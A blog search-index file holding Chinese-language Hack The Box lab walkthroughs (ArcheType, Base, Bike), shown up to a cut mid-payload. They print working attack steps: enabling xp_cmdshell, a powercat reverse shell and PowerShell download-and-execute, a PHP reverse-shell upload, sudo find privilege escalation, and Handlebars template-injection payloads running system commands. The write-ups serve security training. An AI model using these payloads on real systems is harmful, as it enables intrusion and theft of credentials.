<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>HTB-ArcheType</title>
    <url>/2023/06/05/HTB-ArcheType/</url>
    <content><![CDATA[<h5 id="一、哪一个TCP端口托管数据库服务器？"><a href="#一、哪一个TCP端口托管数据库服务器？" class="headerlink" title="一、哪一个TCP端口托管数据库服务器？"></a>一、哪一个TCP端口托管数据库服务器？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV  10.129.186.174</span><br><span class="line">namp -sV -sC 10.129.186.174</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/12/UafI9PnGM3T8Zk1.png" alt="image-20230209095638512"></p>
<h5 id="二、SMB上可用的非管理共享的名称是什么？"><a href="#二、SMB上可用的非管理共享的名称是什么？" class="headerlink" title="二、SMB上可用的非管理共享的名称是什么？"></a>二、SMB上可用的非管理共享的名称是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用SMBclient查看共享名称列表</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-N:不使用密码</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-L:列出名称</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-I:IP地址</span></span><br><span class="line">smbclient -N -L -I 10.129.186.174</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/12/vYLgJc7t6oHnXyA.png" alt="image-20230209100546654"></p>
<h5 id="三、SMB共享上文件中标识的密码是什么？"><a href="#三、SMB共享上文件中标识的密码是什么？" class="headerlink" title="三、SMB共享上文件中标识的密码是什么？"></a>三、SMB共享上文件中标识的密码是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-U:指定用户名和密码</span></span><br><span class="line">smbclient //10.129.186.174/backups -U backups</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">下载共享中的文件</span></span><br><span class="line">get prod.dtsconfig</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/12/aYZbrHqjo5gFXtf.png" alt="image-20230209102628923"></p>
<p><img src="https://s2.loli.net/2023/03/12/ixBZPISEdnChDrK.png" alt="image-20230209102730804"></p>
<h5 id="四、可以使用Impacket集合中的什么脚本来建立与Microsoft-SQL-Server的经过身份验证的连接？"><a href="#四、可以使用Impacket集合中的什么脚本来建立与Microsoft-SQL-Server的经过身份验证的连接？" class="headerlink" title="四、可以使用Impacket集合中的什么脚本来建立与Microsoft SQL Server的经过身份验证的连接？"></a>四、可以使用Impacket集合中的什么脚本来建立与Microsoft SQL Server的经过身份验证的连接？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">经过提示在impacket工具里面，直接在kali工具中寻找</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">https://www.kali.org/tools/impacket-scripts/<span class="comment">#impacket-mssqlclient</span></span></span><br><span class="line">mssqlclient.py</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/12/5YfcjNBeWV3THFs.png" alt="image-20230209140646709"></p>
<h5 id="五、可以使用Microsoft-SQL-Server的哪些扩展存储过程来生成Windows命令shell？"><a href="#五、可以使用Microsoft-SQL-Server的哪些扩展存储过程来生成Windows命令shell？" class="headerlink" title="五、可以使用Microsoft SQL Server的哪些扩展存储过程来生成Windows命令shell？"></a>五、可以使用Microsoft SQL Server的哪些扩展存储过程来生成Windows命令shell？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xp_cmdshell</span><br></pre></td></tr></table></figure>

<h5 id="六、可以使用什么脚本来搜索可能路径以提升-Windows-主机上的权限？"><a href="#六、可以使用什么脚本来搜索可能路径以提升-Windows-主机上的权限？" class="headerlink" title="六、可以使用什么脚本来搜索可能路径以提升 Windows 主机上的权限？"></a>六、可以使用什么脚本来搜索可能路径以提升 Windows 主机上的权限？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">WinPEAS.exe 的目标是在 Windows 环境中搜索可能的权限提升路径，需要目标系统（.Net &gt;= 4.5.2）环境，支持打印输出颜色</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">https://github.com/carlospolop/PEASS-ng</span></span><br><span class="line">winpeas</span><br></pre></td></tr></table></figure>

<h5 id="七、什么文件包含管理员的密码？"><a href="#七、什么文件包含管理员的密码？" class="headerlink" title="七、什么文件包含管理员的密码？"></a>七、什么文件包含管理员的密码？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第三题中获取了数据库的用户名和密码，可以用impacket-mssqlclient连接</span></span><br><span class="line">sudo impacket-mssqlclient sql_svc@10.129.8.215 -windows-auth</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/12/Jy6cAZ3OraTjHXb.png" alt="image-20230210172312106"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">开启xp——cmdshell，使用impactet自带的enable_xp_cmdshell</span></span><br><span class="line">enable_xp_cmdshell</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用命令开启</span></span><br><span class="line">sp_configure &#x27;show advanced options&#x27;,1</span><br><span class="line">reconfigure</span><br><span class="line">sp_configure &#x27;xp_cmdshell&#x27;,1</span><br><span class="line">reconfigure</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">测试是否开启成功(直接使用xp_cmdshell可能会有问题)</span></span><br><span class="line">exec master..xp_cmdshell &quot;whoami&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/12/REdTpNPl4mY6V7t.png" alt="image-20230210172755910"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">目标系统为windows server 2008R2，可以尝试制作ps1文件获取shell</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用powercat或者直接复制网上代码修改IP地址和端口即可</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">powercat项目地址</span></span><br><span class="line">https://github.com/besimorhino/powercat</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">管理员打开powershell（注意关闭杀毒软件）</span></span><br><span class="line">Set-ExecutionPolicy Unrestricted</span><br><span class="line">Import-Module .\powercat.ps1</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">生成使用powershell -e可以直接执行的shell</span></span><br><span class="line">powercat.ps1 -c 10.10.14.28 -p 4444 -ge shell.ps1</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/12/W9TnY3EZml5ieNL.png" alt="image-20230213100244621"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将shell.ps1文件放到目录中，并在此目录下开启python服务</span></span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/12/TzGVZtWbyfX1IFK.png" alt="image-20230213100745691"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用cmdshell远程下载shell.ps1，并执行</span></span><br><span class="line">exec master..xp_cmdshell &quot;powershell -exec bypass -c IEX(New-Object System.Net.WebClient).DownloadString(&#x27;URI&#x27;);&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/12/IHw3UGgtNJ1ei7h.png" alt="image-20230213102017499"></p>
<p><img src="https://s2.loli.net/2023/03/12/mzD5UTjXcpgBlqF.png" alt="image-20230213102031680"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">获取shell</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/12/NackPeULGdT2AFz.png" alt="image-20230213102115639"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用前面提到过的提权工具winpeas,获取一些文件路径和系统漏洞</span></span><br><span class="line">curl http://10.10.14.28/winPEASx86.exe -O winPEAS.exe</span><br><span class="line">.\winPEAS.exe</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/12/qgSPM2ihFytjU7Q.png" alt="image-20230213144516932"></p>
<p><img src="https://s2.loli.net/2023/03/12/petE5PMhTDvqld2.png" alt="image-20230213144441436"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">找到consolehost_histroy.txt，找到administrator的密码</span></span><br><span class="line">type consolehost_history.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/12/ADp6KkM3CXnrcBi.png" alt="image-20230213144913612"></p>
<p><img src="https://s2.loli.net/2023/03/12/RS9T43Xo21starU.png" alt="image-20230213144952975"></p>
<h5 id="八、提交user的flag"><a href="#八、提交user的flag" class="headerlink" title="八、提交user的flag"></a>八、提交user的flag</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">切换到C:\<span class="built_in">users</span>\sql_svc\Desktop</span></span><br><span class="line">type user.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/12/Ua56eBvx2fMwsI1.png" alt="image-20230213145241184"></p>
<h5 id="九、提交root的flag"><a href="#九、提交root的flag" class="headerlink" title="九、提交root的flag"></a>九、提交root的flag</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用impacket-psexec连接10.129.11.234</span></span><br><span class="line">impacket-psexec administrator@10.129.11.234</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/12/bq7eZATiOmw9sMg.png" alt="image-20230213145557664"></p>
<p><img src="https://s2.loli.net/2023/03/12/bGBXZxYA2NR6EQm.png" alt="image-20230213145802945"></p>
<hr>
<h5 id="十、总结"><a href="#十、总结" class="headerlink" title="十、总结"></a>十、总结</h5><ul>
<li>impacket工具使用</li>
<li>powershell后门的制作</li>
<li>winpeas工具的使用</li>
<li>consolehost_history.txt文件的作用</li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>HTB</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Base</title>
    <url>/2023/07/06/HTB-Base/</url>
    <content><![CDATA[<h5 id="一、远程主机上开放的端口是什么？"><a href="#一、远程主机上开放的端口是什么？" class="headerlink" title="一、远程主机上开放的端口是什么？"></a>一、远程主机上开放的端口是什么？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#使用nmap进行扫描</span><br><span class="line">nmap -sV -sC IP</span><br><span class="line">22,80</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/23/wPLgEBFHlpWM12Y.png" alt="image-20230321104936010"></p>
<h5 id="二、登录页面的-URL-是什么？"><a href="#二、登录页面的-URL-是什么？" class="headerlink" title="二、登录页面的 URL 是什么？"></a>二、登录页面的 URL 是什么？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#点击网页右上角登录，重定向到登陆页面</span><br><span class="line">/login/login.php</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/23/nchD6dtgxV3NOWK.png"></p>
<h5 id="三、“-x2F-login”目录中有多少个文件？"><a href="#三、“-x2F-login”目录中有多少个文件？" class="headerlink" title="三、“&#x2F;login”目录中有多少个文件？"></a>三、“&#x2F;login”目录中有多少个文件？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#访问login目录，发现3个文件</span><br><span class="line">3</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/23/e4oFObdXiIyAUWz.png" alt="image-20230321135246282"></p>
<h5 id="四、swap文件的文件扩展名是什么？"><a href="#四、swap文件的文件扩展名是什么？" class="headerlink" title="四、	swap文件的文件扩展名是什么？"></a>四、	swap文件的文件扩展名是什么？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#文件在/login目录下</span><br><span class="line">.swp</span><br></pre></td></tr></table></figure>

<h5 id="五、后端代码中使用了哪个-PHP-函数将用户提交的用户名和密码与有效的用户名和密码进行比较？"><a href="#五、后端代码中使用了哪个-PHP-函数将用户提交的用户名和密码与有效的用户名和密码进行比较？" class="headerlink" title="五、后端代码中使用了哪个 PHP 函数将用户提交的用户名和密码与有效的用户名和密码进行比较？"></a>五、后端代码中使用了哪个 PHP 函数将用户提交的用户名和密码与有效的用户名和密码进行比较？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#下载login.php.swp文件，修改后缀为.php文件</span><br><span class="line">strcmp()</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/23/PDGpfcEwQuXL7t9.png" alt="image-20230321135629975"></p>
<h5 id="六、上传的文件存储在哪个目录中？"><a href="#六、上传的文件存储在哪个目录中？" class="headerlink" title="六、上传的文件存储在哪个目录中？"></a>六、上传的文件存储在哪个目录中？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用gobuster扫描，字典为/usr/share/wordlists/dirb/big.txt</span></span><br><span class="line">gobuster dir -u &quot;http://10.129.239.47/&quot; -w /usr/share/wordlists/dirb/big.txt </span><br><span class="line">/_uploaded </span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/23/OvUND5GwacExtuP.png" alt="image-20230321142735727"></p>
<h5 id="七、远程主机上存在哪个用户具有主目录？"><a href="#七、远程主机上存在哪个用户具有主目录？" class="headerlink" title="七、远程主机上存在哪个用户具有主目录？"></a>七、远程主机上存在哪个用户具有主目录？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在登陆页面使用任意用户名密码登录，使用Burp抓包</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改username=admin&amp;password=admin为username[]=admin&amp;password[]=admin，302跳转后登陆成功</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改/usr/share/webshells/php/php-reverse-shell.php中的IP和端口参数</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在/upload.php页面中，上传shell</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">访问http://IP/_uploaded/php-reverse-shell.php页面获取shell</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">获取到的权限是www-data，查看/etc/passwd</span></span><br><span class="line">cat /etc/passwd</span><br><span class="line">john</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/23/pCqLiS3rzPuI4Fx.png" alt="image-20230321150534865"></p>
<p><img src="https://s2.loli.net/2023/03/23/HemfYALnJV4GsPq.png" alt="image-20230321150647400"></p>
<p><img src="https://s2.loli.net/2023/03/23/QtSv84D93OIeKT2.png" alt="image-20230321150656325"></p>
<p><img src="https://s2.loli.net/2023/03/23/wICp9OVFaAHcnzi.png" alt="image-20230321150822556"></p>
<p><img src="https://s2.loli.net/2023/03/23/eSDH1q6U7LsNQom.png" alt="image-20230321151015570"></p>
<p><img src="https://s2.loli.net/2023/03/23/lgUdAP68hw2xm3J.png" alt="image-20230321151221935"></p>
<h5 id="八、系统上存在的用户的密码是什么？"><a href="#八、系统上存在的用户的密码是什么？" class="headerlink" title="八、系统上存在的用户的密码是什么？"></a>八、系统上存在的用户的密码是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">切换到/var/www/html/login目录下</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看config.php文件</span></span><br><span class="line">cat /var/www/html/login/config.php</span><br><span class="line">thisisagoodpassword</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/23/9ndIZAjH3aRe4bV.png" alt="image-20230321151614034"></p>
<h5 id="九、用户-john-可以在远程主机上以用户-root-身份运行的命令的完整路径是什么？"><a href="#九、用户-john-可以在远程主机上以用户-root-身份运行的命令的完整路径是什么？" class="headerlink" title="九、用户 john 可以在远程主机上以用户 root 身份运行的命令的完整路径是什么？"></a>九、用户 john 可以在远程主机上以用户 root 身份运行的命令的完整路径是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">切换到john用户，密码为thisisagoodpassword</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行sudo -l(列出用户权限或者检查特定命令)</span></span><br><span class="line">sudo -l</span><br><span class="line">/usr/bin/find</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/23/ILKBMrpeND5PRbh.png" alt="image-20230321155451722"></p>
<h5 id="十、find-命令可以使用什么操作来执行命令？"><a href="#十、find-命令可以使用什么操作来执行命令？" class="headerlink" title="十、find 命令可以使用什么操作来执行命令？"></a>十、find 命令可以使用什么操作来执行命令？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec</span><br></pre></td></tr></table></figure>

<h5 id="十一、提交userflag"><a href="#十一、提交userflag" class="headerlink" title="十一、提交userflag"></a>十一、提交userflag</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">切换到john用户</span></span><br><span class="line">cat /home/john/user.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/23/MW928mlHOB3QkyE.png" alt="image-20230321160446152"></p>
<h5 id="十二、提交rootflag"><a href="#十二、提交rootflag" class="headerlink" title="十二、提交rootflag"></a>十二、提交rootflag</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行/usr/bin/find</span></span><br><span class="line">sudo /usr/bin/find -exec /bin/bash \;</span><br><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/23/oaPFr1xOXWqp8c6.png" alt="image-20230321161816954"></p>
<p><img src="https://s2.loli.net/2023/03/23/qI5zl8pXCSJkZVd.png" alt="image-20230321161835354"></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Bike</title>
    <url>/2023/07/06/HTB-Bike/</url>
    <content><![CDATA[<h5 id="一、nmap-将哪些-TCP-端口标识为打开？从低到高，英文逗号隔开"><a href="#一、nmap-将哪些-TCP-端口标识为打开？从低到高，英文逗号隔开" class="headerlink" title="一、nmap 将哪些 TCP 端口标识为打开？从低到高，英文逗号隔开"></a>一、nmap 将哪些 TCP 端口标识为打开？从低到高，英文逗号隔开</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">nmap扫描目标IP</span></span><br><span class="line">nmap -sV -sC IP</span><br><span class="line">22,80</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/13/NjoC9aiKtYnOgFk.png" alt="image-20230313104132830"></p>
<h5 id="二、什么软件正在运行侦听第一个问题中标识的-http-x2F-web-端口的服务？"><a href="#二、什么软件正在运行侦听第一个问题中标识的-http-x2F-web-端口的服务？" class="headerlink" title="二、什么软件正在运行侦听第一个问题中标识的 http&#x2F;web 端口的服务？"></a>二、什么软件正在运行侦听第一个问题中标识的 http&#x2F;web 端口的服务？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Node.js</span><br></pre></td></tr></table></figure>

<h5 id="三、根据Wappalyzer的说法，Web框架的名称是什么？"><a href="#三、根据Wappalyzer的说法，Web框架的名称是什么？" class="headerlink" title="三、根据Wappalyzer的说法，Web框架的名称是什么？"></a>三、根据Wappalyzer的说法，Web框架的名称是什么？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Express</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/13/A2TDLnCBu98GqUH.png" alt="image-20230313104757061"></p>
<h5 id="四、我们通过提交-测试的漏洞的名称是什么？"><a href="#四、我们通过提交-测试的漏洞的名称是什么？" class="headerlink" title="四、我们通过提交  测试的漏洞的名称是什么？"></a>四、我们通过提交 49 测试的漏洞的名称是什么？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#SSTI服务器端模板注入</span><br><span class="line">Server Side Template Injection</span><br></pre></td></tr></table></figure>

<h5 id="五、Node-JS-中使用的模板引擎是什么？"><a href="#五、Node-JS-中使用的模板引擎是什么？" class="headerlink" title="五、Node.JS 中使用的模板引擎是什么？"></a>五、Node.JS 中使用的模板引擎是什么？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#再网页中提交&#123;&#123;7*7&#125;&#125;，burp抓包查看错误信息</span><br><span class="line">handlebars</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/13/bD7VuKJGR1U3wPC.png" alt="image-20230313105429598"></p>
<h5 id="六、用于编码文本的-BurpSuite-选项卡的名称是什么？"><a href="#六、用于编码文本的-BurpSuite-选项卡的名称是什么？" class="headerlink" title="六、用于编码文本的 BurpSuite 选项卡的名称是什么？"></a>六、用于编码文本的 BurpSuite 选项卡的名称是什么？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Decoder</span><br></pre></td></tr></table></figure>

<h5 id="七、为了在-HTTP-请求中发送有效负载中的特殊字符，我们将对有效负载进行编码。我们使用什么类型的编码？"><a href="#七、为了在-HTTP-请求中发送有效负载中的特殊字符，我们将对有效负载进行编码。我们使用什么类型的编码？" class="headerlink" title="七、为了在 HTTP 请求中发送有效负载中的特殊字符，我们将对有效负载进行编码。我们使用什么类型的编码？"></a>七、为了在 HTTP 请求中发送有效负载中的特殊字符，我们将对有效负载进行编码。我们使用什么类型的编码？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url</span><br></pre></td></tr></table></figure>

<h5 id="八、当我们使用来自-HackTricks-的有效负载来尝试运行系统命令时，我们会收到错误。响应错误中的“未定义”是什么？"><a href="#八、当我们使用来自-HackTricks-的有效负载来尝试运行系统命令时，我们会收到错误。响应错误中的“未定义”是什么？" class="headerlink" title="八、当我们使用来自 HackTricks 的有效负载来尝试运行系统命令时，我们会收到错误。响应错误中的“未定义”是什么？"></a>八、当我们使用来自 HackTricks 的有效负载来尝试运行系统命令时，我们会收到错误。响应错误中的“未定义”是什么？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#在下面的网址中找到Handlebars (NodeJS)对应的POC，修改命令使用decoder url编码</span><br><span class="line">#https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs</span><br><span class="line">#使用burp发送url编码后的payload</span><br><span class="line">require</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">#<span class="variable constant_">POC</span></span><br><span class="line">&#123;&#123;#<span class="keyword">with</span> <span class="string">&quot;s&quot;</span> <span class="keyword">as</span> |string|&#125;&#125;</span><br><span class="line">  &#123;&#123;#<span class="keyword">with</span> <span class="string">&quot;e&quot;</span>&#125;&#125;</span><br><span class="line">    &#123;&#123;#<span class="keyword">with</span> split <span class="keyword">as</span> |conslist|&#125;&#125;</span><br><span class="line">      &#123;&#123;<span class="variable language_">this</span>.<span class="property">pop</span>&#125;&#125;</span><br><span class="line">      &#123;&#123;<span class="variable language_">this</span>.<span class="property">push</span> (lookup string.<span class="property">sub</span> <span class="string">&quot;constructor&quot;</span>)&#125;&#125;</span><br><span class="line">      &#123;&#123;<span class="variable language_">this</span>.<span class="property">pop</span>&#125;&#125;</span><br><span class="line">      &#123;&#123;#<span class="keyword">with</span> string.<span class="property">split</span> <span class="keyword">as</span> |codelist|&#125;&#125;</span><br><span class="line">        &#123;&#123;<span class="variable language_">this</span>.<span class="property">pop</span>&#125;&#125;</span><br><span class="line">        &#123;&#123;<span class="variable language_">this</span>.<span class="property">push</span> <span class="string">&quot;return require(&#x27;child_process&#x27;).exec(&#x27;whoami&#x27;);&quot;</span>&#125;&#125;</span><br><span class="line">        &#123;&#123;<span class="variable language_">this</span>.<span class="property">pop</span>&#125;&#125;</span><br><span class="line">        &#123;&#123;#each conslist&#125;&#125;</span><br><span class="line">          &#123;&#123;#<span class="keyword">with</span> (string.<span class="property">sub</span>.<span class="property">apply</span> <span class="number">0</span> codelist)&#125;&#125;</span><br><span class="line">            &#123;&#123;<span class="variable language_">this</span>&#125;&#125;</span><br><span class="line">          &#123;&#123;/<span class="keyword">with</span>&#125;&#125;</span><br><span class="line">        &#123;&#123;/each&#125;&#125;</span><br><span class="line">      &#123;&#123;/<span class="keyword">with</span>&#125;&#125;</span><br><span class="line">    &#123;&#123;/<span class="keyword">with</span>&#125;&#125;</span><br><span class="line">  &#123;&#123;/<span class="keyword">with</span>&#125;&#125;</span><br><span class="line">&#123;&#123;/<span class="keyword">with</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/13/ONCHsxtm4qQ2pKy.png" alt="image-20230313112101360"></p>
<h5 id="九、Node-JS-中顶级作用域的名称是什么变量？"><a href="#九、Node-JS-中顶级作用域的名称是什么变量？" class="headerlink" title="九、Node.JS 中顶级作用域的名称是什么变量？"></a>九、Node.JS 中顶级作用域的名称是什么变量？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">global</span><br></pre></td></tr></table></figure>

<h5 id="十、通过利用此漏洞，我们以运行-Web-服务器的用户身份执行命令。该用户的名称是什么？"><a href="#十、通过利用此漏洞，我们以运行-Web-服务器的用户身份执行命令。该用户的名称是什么？" class="headerlink" title="十、通过利用此漏洞，我们以运行 Web 服务器的用户身份执行命令。该用户的名称是什么？"></a>十、通过利用此漏洞，我们以运行 Web 服务器的用户身份执行命令。该用户的名称是什么？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#将POC进行URL编码，使用burp发送poc</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;&#123;#<span class="keyword">with</span> <span class="string">&quot;s&quot;</span> <span class="keyword">as</span> |string|&#125;&#125;</span><br><span class="line">  &#123;&#123;#<span class="keyword">with</span> <span class="string">&quot;e&quot;</span>&#125;&#125;</span><br><span class="line">    &#123;&#123;#<span class="keyword">with</span> split <span class="keyword">as</span> |conslist|&#125;&#125;</span><br><span class="line">      &#123;&#123;<span class="variable language_">this</span>.<span class="property">pop</span>&#125;&#125;</span><br><span class="line">      &#123;&#123;<span class="variable language_">this</span>.<span class="property">push</span> (lookup string.<span class="property">sub</span> <span class="string">&quot;constructor&quot;</span>)&#125;&#125;</span><br><span class="line">      &#123;&#123;<span class="variable language_">this</span>.<span class="property">pop</span>&#125;&#125;</span><br><span class="line">      &#123;&#123;#<span class="keyword">with</span> string.<span class="property">split</span> <span class="keyword">as</span> |codelist|&#125;&#125;</span><br><span class="line">        &#123;&#123;<span class="variable language_">this</span>.<span class="property">pop</span>&#125;&#125;</span><br><span class="line">        &#123;&#123;<span class="variable language_">this</span>.<span class="property">push</span> <span class="string">&quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;);&quot;</span>&#125;&#125;</span><br><span class="line">        &#123;&#123;<span class="variable language_">this</span>.<span class="property">pop</span>&#125;&#125;</span><br><span class="line">        &#123;&#123;#each conslist&#125;&#125;</span><br><span class="line">          &#123;&#123;#<span class="keyword">with</span> (string.<span class="property">sub</span>.<span class="property">apply</span> <span class="number">0</span> codelist)&#125;&#125;</span><br><span class="line">            &#123;&#123;<span class="variable language_">this</span>&#125;&#125;</span><br><span class="line">          &#123;&#123;/<span class="keyword">with</span>&#125;&#125;</span><br><span class="line">        &#123;&#123;/each&#125;&#125;</span><br><span class="line">      &#123;&#123;/<span class="keyword">with</span>&#125;&#125;</span><br><span class="line">    &#123;&#123;/<span class="keyword">with</span>&#125;&#125;</span><br><span class="line">  &#123;&#123;/<span class="keyword">with</span>&#125;&#125;</span><br><span class="line">&#123;&#123;/<span class="keyword">with</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/13/G4VrUQ6oaReEOkN.png" alt="image-20230313145622934"></p>
<h5 id="十一、提交flag"><a href="#十一、提交flag" class="headerlink" title="十一、提交flag"></a>十一、提交flag</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#将POC修改为find / type f -name flag.txt 2&gt;/dev/null -exec cat &#123;&#125; \;</span><br><span class="line">6b258d726d287462d60c103d0142a81c</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">#<span class="variable constant_">POC</span></span><br><span class="line">&#123;&#123;#<span class="keyword">with</span> <span class="string">&quot;s&quot;</span> <span class="keyword">as</span> |string|&#125;&#125;</span><br><span class="line">  &#123;&#123;#<span class="keyword">with</span> <span class="string">&quot;e&quot;</span>&#125;&#125;</span><br><span class="line">    &#123;&#123;#<span class="keyword">with</span> split <span class="keyword">as</span> |conslist|&#125;&#125;</span><br><span class="line">      &#123;&#123;<span class="variable language_">this</span>.<span class="property">pop</span>&#125;&#125;</span><br><span class="line">      &#123;&#123;<span class="variable language_">this</span>.<span class="property">push</span> (lookup string.<span class="property">sub</span> <span class="string">&quot;constructor&quot;</span>)&#125;&#125;</span><br><span class="line">      &#123;&#123;<span class="variable language_">this</span>.<span class="property">pop</span>&#125;&#125;</span><br><span class="line">      &#123;&#123;#<span 